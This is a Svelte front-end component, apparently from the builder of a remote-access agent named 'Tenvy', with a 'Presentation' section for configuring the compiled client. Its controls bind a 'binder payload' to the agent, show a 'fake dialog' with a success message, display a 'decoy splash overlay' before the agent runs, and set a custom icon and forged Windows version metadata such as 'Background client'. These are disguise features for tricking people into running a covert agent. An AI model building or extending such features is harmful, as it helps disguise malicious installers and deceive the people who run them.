<script lang="ts">
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Collapsible,
		CollapsibleContent,
		CollapsibleTrigger
	} from '$lib/components/ui/collapsible/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { Textarea } from '$lib/components/ui/textarea/index.js';
	import {
		DEFAULT_FILE_INFORMATION,
		FAKE_DIALOG_OPTIONS,
		type FakeDialogType,
		type SplashLayout
	} from '../lib/constants.js';
import { formatFileSize } from '../lib/utils.js';
import ChevronDown from '@lucide/svelte/icons/chevron-down';
	import SplashPreview from './SplashPreview.svelte';

	export let binderFileName: string | null;
	export let binderFileSize: number | null;
	export let binderFileError: string | null;
	export let handleBinderSelection: (event: Event) => void;
	export let clearBinderSelection: () => void;

	export let fakeDialogType: FakeDialogType;
	export let fakeDialogTitle: string;
	export let fakeDialogMessage: string;

	export let splashScreenEnabled: boolean;
	export let splashLayout: SplashLayout;
	export let splashLayoutLabel: string;
	export let normalizedSplashTitle: string;
	export let normalizedSplashSubtitle: string;
	export let normalizedSplashMessage: string;
	export let normalizedSplashAccent: string;
	export let normalizedSplashBackground: string;
	export let normalizedSplashText: string;
	export let openSplashDialog: () => void;

	export let fileIconName: string | null;
	export let fileIconError: string | null;
	export let handleIconSelection: (event: Event) => void;
	export let clearIconSelection: () => void;

	export let isWindowsTarget: boolean;
	export let fileInformationOpen: boolean;
export let fileInformation: typeof DEFAULT_FILE_INFORMATION;
</script>

<section class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div>
		<p class="text-sm font-semibold">Presentation</p>
		<p class="text-xs text-muted-foreground">
			Blend the installer with an optional binder payload or decoy dialog.
		</p>
	</div>
	<div class="space-y-3">
		<Label for="binder-file">Binder payload</Label>
		<div class="flex flex-col gap-3 rounded-lg border border-dashed border-border/60 p-4">
			<input id="binder-file" type="file" class="text-xs" onchange={handleBinderSelection} />
			{#if binderFileName}
				<div class="flex items-center justify-between gap-3 rounded-md bg-muted/40 px-3 py-2 text-xs">
					<div>
						<p class="font-medium">{binderFileName}</p>
						{#if binderFileSize}
							<p class="text-muted-foreground">{formatFileSize(binderFileSize)}</p>
						{/if}
					</div>
					<button type="button" class="text-primary underline" onclick={clearBinderSelection}>
						Remove
					</button>
				</div>
			{/if}
			{#if binderFileError}
				<p class="text-xs text-red-500">{binderFileError}</p>
			{/if}
			<p class="text-xs text-muted-foreground">
				Optional. Attach an additional file to deploy alongside the agent.
			</p>
		</div>
	</div>
	<div class="grid gap-4 md:grid-cols-2">
		<div class="grid gap-2">
			<Label for="fake-dialog-type">Fake dialog</Label>
			<select
				id="fake-dialog-type"
				bind:value={fakeDialogType}
				class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
			>
				{#each FAKE_DIALOG_OPTIONS as option (option.value)}
					<option value={option.value}>{option.label}</option>
				{/each}
			</select>
		</div>
		<div class="grid gap-2">
			<Label for="fake-dialog-title">Dialog title</Label>
			<Input
				id="fake-dialog-title"
				placeholder="Installation complete"
				bind:value={fakeDialogTitle}
				disabled={fakeDialogType === 'none'}
			/>
		</div>
		<div class="grid gap-2 md:col-span-2">
			<Label for="fake-dialog-message">Dialog message</Label>
			<Textarea
				id="fake-dialog-message"
				placeholder="The setup completed successfully."
				bind:value={fakeDialogMessage}
				class="min-h-[120px]"
				disabled={fakeDialogType === 'none'}
			/>
			<p class="text-xs text-muted-foreground">
				Leave blank to use sensible defaults based on the dialog type.
			</p>
		</div>
	</div>
	<div class="space-y-4 rounded-lg border border-dashed border-border/60 p-4">
		<div class="flex flex-wrap items-center justify-between gap-3">
			<div>
				<p class="text-sm font-semibold">Custom splash screen</p>
				<p class="text-xs text-muted-foreground">
					Display a decoy splash overlay before the agent begins execution.
				</p>
			</div>
			<div class="flex items-center gap-3">
				<div class="flex items-center gap-2 text-xs text-muted-foreground">
					<Switch bind:checked={splashScreenEnabled} aria-label="Toggle splash screen" />
					<span>{splashScreenEnabled ? 'Enabled' : 'Disabled'}</span>
				</div>
				<Button type="button" variant="outline" size="sm" onclick={openSplashDialog}>
					Customize
				</Button>
			</div>
		</div>
		{#if splashScreenEnabled}
			<div class="space-y-3">
				<div class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
					<Badge
						variant="outline"
						class="text-[0.65rem] font-semibold tracking-wide uppercase"
					>
						{splashLayoutLabel}
					</Badge>
					<span class="flex items-center gap-1">
						Accent
						<span
							class="h-3 w-3 rounded-full border border-border/70"
							style={`background:${normalizedSplashAccent};`}
						></span>
					</span>
				</div>
				<SplashPreview
					className="shadow-sm"
					layout={splashLayout}
					title={normalizedSplashTitle}
					subtitle={normalizedSplashSubtitle}
					message={normalizedSplashMessage}
					accent={normalizedSplashAccent}
					background={normalizedSplashBackground}
					text={normalizedSplashText}
				/>
				<p class="text-xs text-muted-foreground">
					Colors are applied using the provided hex values. Preview updates in real time.
				</p>
			</div>
		{/if}
	</div>
</section>

{#if isWindowsTarget}
	<section class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
		<div class="space-y-3">
			<Label for="file-icon">Executable icon</Label>
			<div class="flex flex-col gap-3 rounded-lg border border-dashed border-border/60 p-4">
				<input
					id="file-icon"
					type="file"
					accept=".ico"
					class="text-xs"
					onchange={handleIconSelection}
				/>
				{#if fileIconName}
					<div class="flex items-center justify-between rounded-md bg-muted/40 px-3 py-2 text-xs">
						<span class="font-medium">{fileIconName}</span>
						<button type="button" class="text-primary underline" onclick={clearIconSelection}>
							Remove
						</button>
					</div>
				{/if}
				{#if fileIconError}
					<p class="text-xs text-red-500">{fileIconError}</p>
				{/if}
				<p class="text-xs text-muted-foreground">
					Optional. Accepted format: .ico (max 512KB). Only applied to Windows builds.
				</p>
			</div>
		</div>

		<Collapsible class="rounded-lg border border-border/70 p-4" bind:open={fileInformationOpen}>
			<div class="flex flex-wrap items-center justify-between gap-3">
				<div>
					<h3 class="text-sm font-semibold">File information</h3>
					<p class="text-xs text-muted-foreground">
						Populate Windows version metadata for the compiled binary.
					</p>
				</div>
				<CollapsibleTrigger
					class="flex items-center gap-2 rounded-md border border-border/60 px-3 py-1.5 text-xs font-semibold tracking-wide text-muted-foreground uppercase transition hover:bg-muted"
				>
					<span>{fileInformationOpen ? 'Hide metadata' : 'Show metadata'}</span>
					<ChevronDown
						class={`h-4 w-4 transition-transform ${fileInformationOpen ? 'rotate-180' : ''}`}
					/>
				</CollapsibleTrigger>
			</div>
			<CollapsibleContent class="mt-4 space-y-4">
				<div class="grid gap-4 md:grid-cols-2">
					<div class="grid gap-2">
						<Label for="file-description">File description</Label>
						<Input
							id="file-description"
							placeholder="Background client"
							bind:value={fileInformation.fileDescription}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="product-name">Product name</Label>
						<Input
							id="product-name"
							placeholder="Tenvy Agent"
							bind:value={fileInformation.productName}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="company-name">Company name</Label>
						<Input
							id="company-name"
							placeholder="Tenvy Operators"
							bind:value={fileInformation.companyName}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="product-version">Product version</Label>
						<Input
							id="product-version"
							placeholder="1.0.0.0"
							bind:value={fileInformation.productVersion}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="file-version">File version</Label>
						<Input
							id="file-version"
							placeholder="1.0.0.0"
							bind:value={fileInformation.fileVersion}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="original-filename">Original filename</Label>
						<Input
							id="original-filename"
							placeholder="tenvy-client.exe"
							bind:value={fileInformation.originalFilename}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="internal-name">Internal name</Label>
						<Input
							id="internal-name"
							placeholder="tenvy-client"
							bind:value={fileInformation.internalName}
						/>
					</div>
					<div class="grid gap-2">
						<Label for="legal-copyright">Legal copyright</Label>
						<Input
							id="legal-copyright"
							placeholder="© 2025 Tenvy"
							bind:value={fileInformation.legalCopyright}
						/>
					</div>
				</div>
			</CollapsibleContent>
		</Collapsible>
	</section>
{/if}
